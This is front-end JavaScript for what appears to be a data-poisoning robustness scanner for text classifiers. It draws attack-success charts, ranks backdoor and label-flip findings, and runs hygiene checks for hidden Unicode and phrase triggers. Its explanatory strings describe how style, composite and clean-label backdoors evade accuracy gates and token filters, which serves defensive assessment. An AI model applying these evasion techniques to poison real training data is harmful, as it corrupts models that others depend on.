function trendPush(){var s=STATE;TREND.push({n:(s.injected_count||0),acc:(s.poisoned_accuracy||0),asr:(s.asr||0)});HARDENCURVE=[];clearDefSummary();renderTrend();}
function clearDefSummary(){var s=document.getElementById('d-summary');if(s)s.textContent='';}
function renderTrend(){var el=document.getElementById('b-trend');if(!el)return;var W=720,H=230,L=48,R=18,T=16,B=34,pw=W-L-R,ph=H-T-B;
  var maxN=Math.max(20,TREND.length?TREND[TREND.length-1].n:0);
  function X(n){return L+(maxN?n/maxN:0)*pw;}function Y(v){return T+(1-Math.max(0,Math.min(1,v)))*ph;}
  var svg='';[0,.25,.5,.75,1].forEach(function(g){var y=Y(g);svg+='<line x1="'+L+'" y1="'+y.toFixed(1)+'" x2="'+(W-R)+'" y2="'+y.toFixed(1)+'" stroke="#181a24"/><text x="'+(L-8)+'" y="'+(y+4).toFixed(1)+'" fill="#565b6d" font-size="11" text-anchor="end">'+(g*100)+'%</text>';});
  svg+='<text x="'+L+'" y="'+(H-8)+'" fill="#565b6d" font-size="11">0</text><text x="'+(W-R)+'" y="'+(H-8)+'" fill="#565b6d" font-size="11" text-anchor="end">'+maxN+' rows injected →</text>';
  function ln(arr,k,c,dash){var p=arr.map(function(d){return X(d.n).toFixed(1)+','+Y(d[k]).toFixed(1);}).join(' ');return (arr.length>1?'<polyline points="'+p+'" fill="none" stroke="'+c+'" stroke-width="2.5" stroke-linejoin="round"'+(dash?' stroke-dasharray="5 4"':'')+'/>':'')+arr.map(function(d){return '<circle cx="'+X(d.n).toFixed(1)+'" cy="'+Y(d[k]).toFixed(1)+'" r="3.5" fill="'+c+'"/>';}).join('');}
  svg+=ln(TREND,'acc','#37d67a')+ln(TREND,'asr','#ff4257');
  if(HARDENCURVE.length){svg+=ln(HARDENCURVE,'asr','#4c9aff',true);var hl=HARDENCURVE[HARDENCURVE.length-1];svg+='<text x="'+(X(hl.n)-7).toFixed(1)+'" y="'+(Y(hl.asr)+17).toFixed(1)+'" fill="#4c9aff" font-size="12.5" font-weight="700" text-anchor="end">'+(hl.asr*100).toFixed(1)+'%</text>';}
  var last=TREND[TREND.length-1];if(last){svg+='<text x="'+(X(last.n)-7).toFixed(1)+'" y="'+(Y(last.acc)-9).toFixed(1)+'" fill="#37d67a" font-size="12.5" font-weight="700" text-anchor="end">'+(last.acc*100).toFixed(1)+'%</text><text x="'+(X(last.n)-7).toFixed(1)+'" y="'+(Y(last.asr)-9).toFixed(1)+'" fill="#ff4257" font-size="12.5" font-weight="700" text-anchor="end">'+(last.asr*100).toFixed(1)+'%</text>';}
  el.innerHTML=svg;
  var lg=document.getElementById('b-trendleg');if(lg){var base='<span><span class="sw" style="background:var(--green)"></span>accuracy (what dashboards track)</span><span><span class="sw" style="background:var(--red)"></span>attack success, undefended</span>';if(HARDENCURVE.length){base+='<span><span class="sw" style="background:#4c9aff"></span>attack success, hardened</span>';}lg.innerHTML=base;}}
function animateHarden(finalCurve){
  if(!finalCurve||!finalCurve.length){HARDENCURVE=[];renderTrend();return;}
  var start=TREND.map(function(d){return d.asr;}),end=finalCurve.map(function(d){return d.asr;});
  var t0=null,dur=720,done=false;
  function finish(){if(done)return;done=true;HARDENCURVE=finalCurve;renderTrend();}
  function frame(ts){
    if(done)return;if(t0===null)t0=ts;
    var k=Math.min(1,(ts-t0)/dur),e=1-Math.pow(1-k,3);
    HARDENCURVE=finalCurve.map(function(d,i){return {n:d.n,acc:d.acc,asr:start[i]+((end[i]||0)-start[i])*e};});
    renderTrend();
    if(k<1){requestAnimationFrame(frame);}else{finish();}
  }
  requestAnimationFrame(frame);
  setTimeout(finish,dur+240);
}
async function renderDPACert(){var box=document.getElementById('dpa-cert');var probe=(document.getElementById('b-probe')||{}).value||'';var c;try{c=await j('/api/dpa/certify',{text:probe});}catch(e){box.innerHTML='';return;}
  var palette={};(STATE.labels||[]).forEach(function(l,i){palette[l]=['#37d67a','#ff4257','#4c9aff','#e0a23a','#a06bff'][i%5];});
  function card(ct){var votes=ct.votes||{},total=0;for(var kk in votes)total+=votes[kk];var seg='';Object.keys(votes).forEach(function(l){var w=total?votes[l]/total*100:0;if(w>0)seg+='<div title="'+esc2(l)+': '+votes[l]+'" style="width:'+w.toFixed(1)+'%;background:'+(palette[l]||'#888')+';display:flex;align-items:center;justify-content:center;font-size:.72rem;color:#08120b;font-weight:700">'+(w>10?votes[l]:'')+'</div>';});
    var r=ct.certified_radius;
    return '<div style="margin:.7rem 0;padding:.9rem 1rem;background:var(--surface2);border:1px solid var(--line);border-radius:14px">'+
      '<div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:.5rem"><div style="font-size:.9rem;color:var(--muted)">'+esc2(ct.label)+' → verdict <b style="color:'+(palette[ct.top]||'#fff')+'">'+esc2(ct.top)+'</b></div><div style="font-size:.85rem;color:var(--faint)">'+ct.top_votes+' vs '+ct.runner_up_votes+' votes</div></div>'+
      '<div style="display:flex;height:22px;border-radius:6px;overflow:hidden;gap:1px">'+seg+'</div>'+
      '<div style="margin-top:.55rem;font-size:.9rem">'+(r>0?('<span class="pill pass">provably robust</span> this verdict cannot be changed by <b>'+r+'</b> poisoned '+esc2(STATE.items||'rows')+', whatever they say'):('<span class="pill fail">no margin</span> the shards are split, so no poisoning guarantee holds here'))+'</div>'+
      '<div style="font-size:.82rem;color:var(--faint);margin-top:.35rem">'+esc2(ct.text)+'</div></div>';}
  box.innerHTML='<div class="deflead" style="margin-bottom:.3rem">Certified robustness over <b>'+c.k+'</b> shards. Each poisoned row lands in one shard, so it can move at most one vote. The lead of the winning class becomes a <b>provable</b> safety margin.</div>'+(c.certificates||[]).map(card).join('');}
var NAV=[{v:'explore',label:'Data'},{v:'scan',label:'Scan'},{v:'attack',label:'Attack'},{v:'bench',label:'Bench',a:1},{v:'hygiene',label:'Hygiene'},{v:'harden',label:'Harden',a:1}];
function navReady(){return !!(STATE&&STATE.attack_type);}
function renderNav(){var host=document.getElementById('steps');if(!host)return;if(VIEW==='welcome'){host.innerHTML='';return;}host.innerHTML=NAV.map(function(t){var locked=t.a&&!navReady();return '<button class="ntab'+(t.v===VIEW?' on':'')+(locked?' lock':'')+'"'+(locked?' title="run an attack first" disabled':' onclick="go(\''+t.v+'\')"')+'>'+t.label+'</button>';}).join('');}
var ALLVIEWS=['welcome','explore','attack','bench','harden','scan','hygiene','guardrail'];
var PREV='explore', NICE={welcome:'start',explore:'the data',scan:'the report',attack:'the attack',bench:'the bench',hygiene:'hygiene',harden:'harden',guardrail:'the guardrail'};
function goBack(){go(PREV||'explore');}
function updateBack(v){var bl=document.querySelector('#v-'+v+' .backlink');if(bl)bl.textContent='← back to '+(NICE[PREV]||PREV);}
function go(v){if(v!==VIEW)PREV=VIEW;VIEW=v;ALLVIEWS.forEach(function(x){var el=document.getElementById('v-'+x);if(el)el.classList.toggle('on',x===v);});renderNav();updateBack(v);window.scrollTo(0,0);if(v==='bench'){refreshBench();}if(v==='harden'){loadHarden();}if(v==='scan'){loadScan();}if(v==='hygiene'){loadHygiene();}if(v==='guardrail'){loadGuardrail();}}
var SCAN={};
function brkRows(f){if(!f.breaks_at_rate)return 0;var p=(f.points||[]).find(function(x){return x.rate===f.breaks_at_rate;});return p?p.rows:0;}
function sparkPts(pts,key,inv){var W=92,H=30,n=(pts||[]).length;if(!n)return '';var pl=pts.map(function(p,i){var x=(n>1?i/(n-1):0)*(W-6)+3;var v=Math.max(0,Math.min(1,p[key]||0));return x.toFixed(1)+','+(H-3-v*(H-6)).toFixed(1);}).join(' ');return '<svg width="'+W+'" height="'+H+'" viewBox="0 0 '+W+' '+H+'"><polyline points="'+pl+'" fill="none" stroke="'+(inv?'#e0a23a':'#ff4257')+'" stroke-width="2" stroke-linejoin="round"/></svg>';}
function toggleFinding(i){var d=document.getElementById('fd-'+i),c=document.getElementById('fchev-'+i);if(!d)return;var open=d.style.display==='none';d.style.display=open?'block':'none';if(c)c.textContent=open?'▴':'▾';}
function fdetail(f,items){
  var trig=(f.attack==='backdoor'||f.attack==='clean-label'||f.attack==='style'||f.attack==='composite'),key=trig?'asr':'recall',col=trig?'#ff4257':'#e0a23a';
  var pts=f.points||[],n=pts.length,W=640,H=214,L=44,R=16,T=16,B=44,pw=W-L-R,ph=H-T-B;
  function X(i){return L+(n>1?i/(n-1):0)*pw;}function Y(v){return T+(1-Math.max(0,Math.min(1,v)))*ph;}
  var svg='';[0,.25,.5,.75,1].forEach(function(g){var y=Y(g);svg+='<line x1="'+L+'" y1="'+y.toFixed(1)+'" x2="'+(W-R)+'" y2="'+y.toFixed(1)+'" stroke="#181a24"/><text x="'+(L-6)+'" y="'+(y+4).toFixed(1)+'" fill="#565b6d" font-size="10" text-anchor="end">'+(g*100)+'%</text>';});
  var yb=Y(0.5);if(trig){svg+='<line x1="'+L+'" y1="'+yb.toFixed(1)+'" x2="'+(W-R)+'" y2="'+yb.toFixed(1)+'" stroke="#4a1c27" stroke-dasharray="4 4"/><text x="'+(W-R)+'" y="'+(yb-5).toFixed(1)+'" fill="#ff6b7d" font-size="10" text-anchor="end">breaks above 50%</text>';}else{svg+='<line x1="'+L+'" y1="'+yb.toFixed(1)+'" x2="'+(W-R)+'" y2="'+yb.toFixed(1)+'" stroke="#4a3a1c" stroke-dasharray="4 4"/><text x="'+(W-R)+'" y="'+(yb-5).toFixed(1)+'" fill="#e0a23a" font-size="10" text-anchor="end">below 50%: the class has flipped</text>';}
  pts.forEach(function(p,i){var x=X(i);svg+='<text x="'+x.toFixed(1)+'" y="'+(H-24)+'" fill="#8b90a2" font-size="10" text-anchor="middle">'+(p.rate*100).toFixed(p.rate<0.01?1:0)+'%</text><text x="'+x.toFixed(1)+'" y="'+(H-11)+'" fill="#565b6d" font-size="9" text-anchor="middle">~'+p.rows+'</text>';});
  if(f.points_random&&f.points_random.length){var rp=f.points_random.map(function(p,i){return X(i).toFixed(1)+','+Y(p[key]).toFixed(1);}).join(' ');svg+='<polyline points="'+rp+'" fill="none" stroke="#8b90a2" stroke-width="2" stroke-dasharray="5 4" stroke-linejoin="round"/>'+f.points_random.map(function(p,i){return '<circle cx="'+X(i).toFixed(1)+'" cy="'+Y(p[key]).toFixed(1)+'" r="2.6" fill="#8b90a2"/>';}).join('');svg+='<text x="'+(L+6)+'" y="'+(T+12)+'" fill="#8b90a2" font-size="10">dashed: random selection</text><text x="'+(L+6)+'" y="'+(T+26)+'" fill="'+col+'" font-size="10">solid: smart (prototypical) selection</text>';}
  var pl=pts.map(function(p,i){return X(i).toFixed(1)+','+Y(p[key]).toFixed(1);}).join(' ');
  svg+='<polyline points="'+pl+'" fill="none" stroke="'+col+'" stroke-width="2.5" stroke-linejoin="round"/>';
  svg+=pts.map(function(p,i){return '<circle cx="'+X(i).toFixed(1)+'" cy="'+Y(p[key]).toFixed(1)+'" r="3.5" fill="'+col+'"/><text x="'+X(i).toFixed(1)+'" y="'+(Y(p[key])-9).toFixed(1)+'" fill="'+col+'" font-size="10" text-anchor="middle" font-weight="600">'+(p[key]*100).toFixed(0)+'%</text>';}).join('');
  var expl=trig?(f.attack==='style'?('<b>Attack success</b> is the share of test '+esc2(items)+' <b>rewritten into the register</b> that the model now labels <b>'+esc2(f.target)+'</b>. The register alone drifts the clean model to about '+((f.baseline_asr||0)*100).toFixed(0)+'%, so the honest effect is the lift above that. No token, so a rare-token filter has nothing to remove.'):(f.attack==='composite'?('<b>Attack success</b> is the share of test '+esc2(items)+' carrying the <b>pair</b> that the model now labels <b>'+esc2(f.target)+'</b>. Each word is ordinary alone; only their co-occurrence fires. It <b>breaks</b> the first time this rises above 50%.'):('<b>Attack success</b> is the share of test '+esc2(items)+' carrying the trigger that the model now labels <b>'+esc2(f.target)+'</b>. We sweep the poison rate. The attack <b>breaks</b> the first time this rises above 50% (the dashed line).'))):(f.attack==='availability'?('<b>Worst-class recall</b> is how well the hardest-hit class survives as labels are corrupted at random. It falls together with global accuracy, which is exactly why a plain accuracy gate catches this loud attack (and why it takes so much poison).'):('<b>Recall</b> is the share of genuinely <b>'+esc2(f.source)+'</b> test '+esc2(items)+' the model still labels correctly. Flipping labels drags it down. The lower it bottoms out, the more of that class has collapsed.'+(f.points_random?' The solid line flips the model’s <b>most confident</b> '+esc2(f.source)+' examples. The dashed line flips <b>random</b> ones at the same budget. Same number of labels, more damage.':'')));
  return '<div class="fx-axis">'+(trig?'attack success':'recall')+' vs poison injected (% of training set, with approx row count)</div><svg viewBox="0 0 '+W+' '+H+'" style="width:100%;height:auto;display:block">'+svg+'</svg><div class="fxpl">'+expl+'</div>';
}
var SCANSTEPS=['Retraining a clean baseline','Planting a worst-case backdoor on each class','Sweeping poison rates from 0.5% to 10%','Measuring attack-success while accuracy holds','Ranking behaviors by least poison to break'];
var _scanT=null;
function scanStart(){var host=document.getElementById('scansteps');host.innerHTML=SCANSTEPS.map(function(s,i){return '<div class="sstep" id="sstep-'+i+'"><span class="sdot"></span><span>'+escH(s)+'</span></div>';}).join('');document.getElementById('scanload').classList.add('on');var i=0;(function tick(){for(var k=0;k<SCANSTEPS.length;k++){var e=document.getElementById('sstep-'+k);if(e){e.classList.toggle('done',k<i);e.classList.toggle('on',k===i);}}if(i<SCANSTEPS.length-1){i++;_scanT=setTimeout(tick,620);}else{_scanT=null;}})();}
async function scanEnd(){if(_scanT){clearTimeout(_scanT);_scanT=null;}for(var k=0;k<SCANSTEPS.length;k++){var e=document.getElementById('sstep-'+k);if(e){e.classList.remove('on');e.classList.add('done');}}await nap(420);document.getElementById('scanload').classList.remove('on');}
async function loadScan(){if(SCAN&&SCAN.findings){renderScan();return;}scanStart();var __ok=true;try{SCAN=await j('/api/scan');}catch(e){__ok=false;}await scanEnd();if(!__ok)return;renderScan();}
function renderScan(){
  var items=SCAN.items||'examples',w=SCAN.weakest,wk=document.getElementById('scan-weak');
  var sevRank={critical:0,high:1,medium:2,low:3};
  function trigAtk(a){return a==='backdoor'||a==='clean-label'||a==='style'||a==='composite';}
  if(w){var big,sub;
    if(trigAtk(w.attack)){var rows=brkRows(w);big='A '+(w.attack==='style'?'style ':w.attack==='clean-label'?'clean-label ':'')+'backdoor forcing inputs to <b>'+esc2(w.target)+'</b> succeeds at <b>'+(w.breaks_at_rate?(w.breaks_at_rate*100).toFixed(1)+'% poison':'low rates')+'</b>'+(rows?' (about '+rows+' '+esc2(items)+' out of '+(SCAN.train_size||0).toLocaleString()+')':'');sub='Accuracy never moves, so a dashboard would ship it. Peak attack success '+(w.peak*100).toFixed(0)+'%.';}
    else if(w.attack==='availability'){big='Corrupting labels broadly drops worst-class recall to <b>'+(w.worst_recall*100).toFixed(0)+'%</b>';sub='The loud one: global accuracy moves too, so an accuracy gate catches it.';}
    else if(w.attack==='subpopulation'){big='Flipping only the <b>“'+esc2(w.subgroup)+'”</b> slice collapses its recall to <b>'+(w.worst_recall*100).toFixed(0)+'%</b>, while global accuracy holds';sub='A tiny, slice-only budget; only a worst-group metric sees it.';}
    else{big='Flipping <b>'+esc2(w.source)+' to '+esc2(w.target)+'</b> collapses '+esc2(w.source)+' recall to <b>'+(w.worst_recall*100).toFixed(0)+'%</b>';sub='Breaks at '+(w.breaks_at_rate?(w.breaks_at_rate*100).toFixed(1)+'% poison':'higher rates')+'.';}
    wk.innerHTML='<div class="weakcard"><div class="wl">Highest risk · '+esc2(w.severity)+'</div><div class="wbig">'+big+'</div><div class="wsub">'+sub+'</div><button class="btn p wbtn" onclick="reproduce(0)">Reproduce this attack →</button></div>';
  }else wk.innerHTML='';
  var GROUPS=[['backdoor','Trigger backdoor','A rare phrase forces any input to a target class. Fast and stealthy.'],['clean-label','Label-consistent backdoor','The same trigger hidden in genuine target examples. Labels stay correct, so relabeling misses it.'],['composite','Composite trigger','Two ordinary words that are harmless alone. Only their pairing is the trigger, so a single-token scan flags neither.'],['style','Style backdoor','A formal register rather than a token. Labels stay correct and no rare token appears, so a rare-token or Unicode filter has nothing to remove.'],['targeted-flip','Targeted label flip','Relabel one class as another. Louder, and it also dents accuracy.'],['subpopulation','Subpopulation poisoning','Flip labels only inside a named slice. Global accuracy barely moves, so a dashboard sees nothing, while that one subgroup collapses.'],['availability','Availability (DoS)','Corrupt labels broadly to degrade the whole model. The loud one: it moves global accuracy, so an accuracy gate catches it.']];
  var tally={critical:0,high:0,medium:0,low:0};(SCAN.findings||[]).forEach(function(f){if(tally[f.severity]!=null)tally[f.severity]++;});
  var sumHtml=['critical','high','medium','low'].filter(function(s){return tally[s];}).map(function(s){return '<span class="sevtally '+s+'"><b>'+tally[s]+'</b> '+s+'</span>';}).join('');
  var blocks=[];
  GROUPS.forEach(function(g){
    var rows=[];SCAN.findings.forEach(function(f,i){if(f.attack===g[0])rows.push({f:f,i:i});});
    if(!rows.length)return;
    rows.sort(function(a,b){return sevRank[a.f.severity]-sevRank[b.f.severity];});
    var worst=rows[0].f.severity;
    var html='<div class="fghead"><span class="sev '+worst+'">'+worst+'</span><div class="fgt"><div class="fgtitle">'+g[1]+'</div><div class="fgdesc">'+g[2]+'</div></div></div>'+rows.map(function(x){var f=x.f,meta,spark,label;
      if(trigAtk(f.attack)){label=(f.attack==='composite'?'pair forces to ':'forces to ')+esc2(f.target);meta=f.breaks_at_rate?('breaks at <b>'+(f.breaks_at_rate*100).toFixed(1)+'%</b> (about '+brkRows(f)+' '+esc2(items)+' out of '+(SCAN.train_size||0).toLocaleString()+')'):('peak <b>'+(f.peak*100).toFixed(0)+'%</b>, holds at these rates');spark=sparkPts(f.points,'asr',false);}
      else if(f.attack==='availability'){label='degrades all classes';meta='worst-class recall bottoms out at <b>'+(f.worst_recall*100).toFixed(0)+'%</b> (and accuracy moves too)';spark=sparkPts(f.points,'recall',true);}
      else if(f.attack==='subpopulation'){label=esc2(f.source)+' → '+esc2(f.target)+' in “'+esc2(f.subgroup)+'”';meta='the “'+esc2(f.subgroup)+'” slice recall bottoms out at <b>'+(f.worst_recall*100).toFixed(0)+'%</b> while global accuracy holds';spark=sparkPts(f.points,'recall',true);}
      else{label=esc2(f.source)+' to '+esc2(f.target);meta=(f.breaks_at_rate?('flips the class at <b>'+(f.breaks_at_rate*100).toFixed(0)+'% poison</b> · '):'')+esc2(f.source)+' recall bottoms out at <b>'+(f.worst_recall*100).toFixed(0)+'%</b>';spark=sparkPts(f.points,'recall',true);}
      return '<div class="fcard" onclick="toggleFinding('+x.i+')"><span class="sev '+f.severity+'">'+f.severity+'</span><div class="fmain"><div class="ftitle">'+label+'</div><div class="fmeta">'+meta+'</div></div><div class="fspark">'+spark+'</div><button class="bbtn g fbtn" onclick="event.stopPropagation();reproduce('+x.i+')">Reproduce →</button><span class="fchev" id="fchev-'+x.i+'">▾</span></div><div class="fdetail" id="fd-'+x.i+'" style="display:none">'+fdetail(f,items)+'</div>';
    }).join('');
    blocks.push({rank:sevRank[worst],html:html});
  });
  blocks.sort(function(a,b){return a.rank-b.rank;});
  document.getElementById('scan-findings').innerHTML=(sumHtml?'<div class="sevsummary">'+sumHtml+'</div>':'')+blocks.map(function(b){return b.html;}).join('');
  document.getElementById('scan-note').innerHTML='Scanned '+SCAN.scanned_size.toLocaleString()+(SCAN.scanned_size<SCAN.train_size?(' of '+SCAN.train_size.toLocaleString()):'')+' training '+esc2(items)+' · single seed · the worst-case backdoor uses a distinctive dirty-label probe trigger. These are risk estimates from a single seed, not guarantees.';
  document.getElementById('scan-defend').innerHTML='<div class="scandefend"><div class="sdh">Now defend it</div><div class="sdt">Harden the model against <b>all</b> of these findings at once: the model-wide train-time defenses that reduce every backdoor, plus one behavioral canary that gates every fragile behavior in CI. (To deep-dive a single vulnerability instead, hit <b>Reproduce</b> on it above, then <b>Harden against this</b> on the bench.)</div><div class="sdbtns"><button class="btn p" onclick="go(\'guardrail\')">Harden against all findings →</button><button class="btn g" onclick="go(\'hygiene\')">🔎 Audit the data (Hygiene) →</button></div></div>';
  document.getElementById('scan-export').innerHTML='<button class="bbtn g" onclick="dlScanReport()">↓ Download report (.md)</button><button class="bbtn g" onclick="copyScanReport(this)">Copy</button><button class="bbtn g" onclick="dlScanJson()">.json</button>';
}
var _ATKN={backdoor:'Trigger backdoor','clean-label':'Label-consistent backdoor',style:'Style backdoor','targeted-flip':'Targeted label-flip',subpopulation:'Subpopulation poisoning',composite:'Composite trigger',availability:'Availability'};
function scanReportMd(){
  if(!SCAN||!SCAN.findings)return '';
  var items=SCAN.items||'examples',sevRank={critical:0,high:1,medium:2,low:3};
  var proj=(INFO&&INFO.project)||'model',acc=(INFO&&INFO.baseline_accuracy!=null)?(INFO.baseline_accuracy*100).toFixed(1)+'%':'n/a',ncls=(INFO&&INFO.labels)?INFO.labels.length:'?';
  var tally={critical:0,high:0,medium:0,low:0};SCAN.findings.forEach(function(f){if(tally[f.severity]!=null)tally[f.severity]++;});
  function trigAtk(a){return a==='backdoor'||a==='clean-label'||a==='style'||a==='composite';}
  var L=['# Poisoning robustness assessment: '+proj,''];
  L.push('- **Target:** '+proj+' · '+(SCAN.train_size||0).toLocaleString()+' training '+items+' · '+ncls+' classes · clean accuracy '+acc);
  L.push('- **Method:** per-class worst-case keyword backdoor and targeted label-flip, poison swept 0.5% to 10%, single seed.');
  L.push('- **Ranking:** the smallest poison budget that breaks each behavior.','','## Summary','');
  L.push(['critical','high','medium','low'].filter(function(s){return tally[s];}).map(function(s){return '**'+tally[s]+'** '+s;}).join(' · ')||'No findings.');
  var w=SCAN.weakest;
  if(w){var wdesc=trigAtk(w.attack)?('a '+w.attack+' forcing inputs to `'+w.target+'` succeeds at '+(w.breaks_at_rate?(w.breaks_at_rate*100).toFixed(1)+'% poison':'low rates')):(w.attack==='availability'?('corrupting labels broadly drops worst-class recall to '+((w.worst_recall||0)*100).toFixed(0)+'%'):(w.attack==='subpopulation'?('flipping only the `'+w.subgroup+'` slice drops its recall to '+((w.worst_recall||0)*100).toFixed(0)+'%'):('flipping `'+w.source+'` to `'+w.target+'` collapses '+w.source+' recall to '+((w.worst_recall||0)*100).toFixed(0)+'%')));L.push('');L.push('**Highest risk ('+w.severity+'):** '+wdesc+'. Global accuracy holds, so an accuracy gate would ship it.');}
  L.push('','## Findings');
  SCAN.findings.map(function(f,i){return {f:f,i:i};}).sort(function(a,b){return sevRank[a.f.severity]-sevRank[b.f.severity];}).forEach(function(x){
    var f=x.f,trig=trigAtk(f.attack);
    var head=trig?(' → '+f.target):(f.attack==='availability'?' · all classes':(' · '+f.source+' → '+f.target+(f.attack==='subpopulation'?(' in “'+f.subgroup+'”'):'')));
    L.push('','### ['+f.severity.toUpperCase()+'] '+(_ATKN[f.attack]||f.attack)+head);
    if(trig){var rows=brkRows(f);
      L.push('- Breaks at **'+(f.breaks_at_rate?(f.breaks_at_rate*100).toFixed(1)+'%':'n/a')+'** poison'+(rows?(' (~'+rows+' of '+(SCAN.train_size||0).toLocaleString()+' '+items+')'):''));
      L.push('- Peak attack success: **'+((f.peak||0)*100).toFixed(0)+'%**');
      L.push('- Global accuracy unchanged, invisible to an accuracy dashboard.');
    }else if(f.attack==='availability'){
      L.push('- Worst-class recall bottoms out at **'+((f.worst_recall||0)*100).toFixed(0)+'%**, and global accuracy drops with it, so a plain accuracy gate catches this loud attack.');
    }else if(f.attack==='subpopulation'){
      L.push('- The “'+f.subgroup+'” slice recall bottoms out at **'+((f.worst_recall||0)*100).toFixed(0)+'%** while global accuracy holds, so only a worst-group metric sees it.');
    }else{
      L.push('- '+(f.breaks_at_rate?('Flips the class at **'+(f.breaks_at_rate*100).toFixed(0)+'%** poison. '):'')+f.source+' recall bottoms out at **'+((f.worst_recall||0)*100).toFixed(0)+'%**.');
    }
  });
  L.push('','---','Scanned '+(SCAN.scanned_size||0).toLocaleString()+' '+items+' · single seed · risk estimates, not guarantees. Generated by unrelabel · github.com/oz9un/unrelabel.');
  return L.join('\n');
}
function dlScanReport(){var md=scanReportMd();if(md)dlFile('poisoning-assessment.md',md);}
function copyScanReport(btn){var md=scanReportMd();if(md)copyText(md,btn);}
function dlScanJson(){if(SCAN&&SCAN.findings)dlFile('poisoning-assessment.json',JSON.stringify(SCAN,null,2));}
async function loadHygiene(){showLoading('Scanning the training data…');var H;try{H=await j('/api/hygiene');}catch(e){hideLoading();return;}hideLoading();
  var sec=H.security,q=H.quality,susp=H.suspicious,caught=sec.count>0;
  var kinds=Object.keys(sec.kinds||{}).map(function(k){return '<span class="pill fail">'+esc2(k)+': '+sec.kinds[k]+'</span>';}).join(' ');
  var big=caught?('<b>'+sec.count+'</b> rows carry <b>deceptive Unicode</b> a human and grep cannot see. Input hygiene caught this, with near-zero false positives.'):('No deceptive Unicode in the current data. If you injected a lexical, clean-label, or label-only attack, input hygiene alone may not surface it.');
  var vb=document.getElementById('hyg-verdict');vb.className='hverdict'+(caught?' bad':'');
  vb.innerHTML='<div class="hvhead"><span class="hvtag '+(caught?'bad':'ok')+'">'+(caught?'HIDDEN POISON FOUND':'NO DECEPTIVE UNICODE')+'</span><div class="hvpills">'+kinds+'</div></div><div class="hvbig">'+big+'</div>';
  document.getElementById('hsum-hgsec').innerHTML=sec.count?('<b>'+sec.count+'</b> rows'):'none';
  document.getElementById('hyg-security').innerHTML=sec.rows.length?sec.rows.map(function(r){return '<div class="hgrow"><div class="hgk">'+r.kinds.map(esc2).join(', ')+' · <span class="hgl">'+esc2(r.label)+'</span> · row '+r.row+'</div><div class="hgren">'+esc2(r.rendered)+' <span class="hgtag">what you see</span></div><div class="hgesc">'+esc2(r.escaped)+'</div></div>';}).join(''):'<div class="hgempty">Nothing. No zero-width, homoglyph, or bidi characters.</div>';
  document.getElementById('hsum-hgtok').innerHTML='<b>'+susp.total+'</b> flagged · <b>'+susp.unicode_flagged+'</b> unicode-linked';
  document.getElementById('hyg-tokens').innerHTML=(susp.total?('<div class="hgnote"><b>'+susp.total+'</b> tokens are rare and lock onto one label. On real data most are ordinary class-indicative words, which is why input detection alone runs near 25% precision. The <b>'+susp.unicode_flagged+'</b> also carrying hidden Unicode are near-certain triggers.</div>'+susp.top.map(function(s){return '<div class="hgtokrow'+(s.unicode?' uni':'')+'"><span class="hgtoktok mono">'+esc2(s.escaped)+'</span><span class="hgtokmeta">df '+s.df+' · '+(s.concentration*100).toFixed(0)+'% → '+esc2(s.label)+(s.unicode?' <span class="tmode">hidden unicode</span>':'')+'</span></div>';}).join('')):'<div class="hgempty">No rare label-locked tokens.</div>');
  document.getElementById('hsum-hgqual').innerHTML=q.count?('<b>'+q.count+'</b> rows'):'none';
  document.getElementById('hyg-quality').innerHTML=(q.count?('<div class="hgnote">Mojibake, control chars, odd whitespace. These are data-quality issues rather than attacks. Repair or drop them.</div>'+q.rows.map(function(r){return '<div class="hgtokrow"><span class="hgtoktok mono">'+esc2(r.escaped)+'</span><span class="hgtokmeta">'+r.kinds.map(esc2).join(', ')+' · row '+r.row+'</span></div>';}).join('')):'<div class="hgempty">Clean.</div>')+(H.benign_count?('<div class="hgnote" style="margin-top:1rem"><b>'+H.benign_count+'</b> rows have legitimate non-ASCII (emoji, accents, native scripts, curly quotes). Left alone: flagging these would bury the real signal.</div>'):'');
  var phr=(H.phrases&&H.phrases.top)||[];
  var nPair=phr.filter(function(p){return p.kind==='composite';}).length;
  var phrHtml=phr.length?('<div class="hverdict bad" style="margin-bottom:1.1rem"><div class="hvhead"><span class="hvtag bad">PHRASE / PAIR FLAGGED</span></div><div class="hvbig"><b>'+phr.length+'</b> multi-word signal'+(phr.length>1?'s':'')+' lock onto one label where a single-token scan is blind. A repeated <b>constant phrase</b> is the fingerprint of the style backdoor (a fixed closer planted verbatim); a label-locked <b>word pair</b> of two individually-ordinary words is a <b>composite</b> candidate.'+(nPair?' <span style="color:var(--faint)">Pair detection is best-effort: a composite whose words already lean a class slips it, so the behavioral canary is the reliable catch.</span>':'')+'</div>'+phr.map(function(p){return '<div class="hgtokrow uni"><span class="hgtoktok mono">'+esc2(p.phrase)+'</span><span class="hgtokmeta">'+(p.kind==='composite'?'<span class="tmode">pair</span> ':'')+'df '+p.df+' · '+(p.concentration*100).toFixed(0)+'% → '+esc2(p.label)+'</span></div>';}).join('')+'</div>'):'';
  document.getElementById('hyg-blind').innerHTML=phrHtml+'<div class="hxpl"><b>What this scan still cannot see:</b> a targeted label-flip or subpopulation attack leaves no input signal at all (the rows are natural, the labels look plausible), and a clean-label backdoor built on a common word hides among natural class tokens. Those blind spots are why you also need the behavioral canary on the <a onclick="go(\'harden\')" style="color:var(--red);cursor:pointer">harden page</a>.</div>';
  document.getElementById('hsc-hgsec').textContent='▴';renderL2();}
async function renderL2(){var L;try{L=await j('/api/label_audit');}catch(e){document.getElementById('hsum-l2').textContent='n/a';return;}
  var caught=(L.recall!=null&&L.recall>=0.5);
  document.getElementById('hsum-l2').innerHTML=L.poison_count?('<b>'+L.caught+'</b>/'+L.poison_count+' caught'):('<b>'+L.flagged_count+'</b> flagged');
  var prec=(L.precision==null?0:L.precision),rec=(L.recall==null?0:L.recall);
  document.getElementById('l2-verdict').innerHTML='<div class="hgnote">The model was fit out-of-fold and asked which of its own training labels it confidently disagrees with. It flagged <b>'+L.flagged_count+'</b> '+esc2(L.items||'rows')+(L.poison_count?(', of which <b>'+L.caught+'</b> are the poison this session planted'):'')+'.'+(L.poison_count?(' Against the known poison that is <b>'+(rec*100).toFixed(0)+'% recall</b> at <b>'+(prec*100).toFixed(0)+'% precision</b>: real, but noisy.'):'')+'</div>';
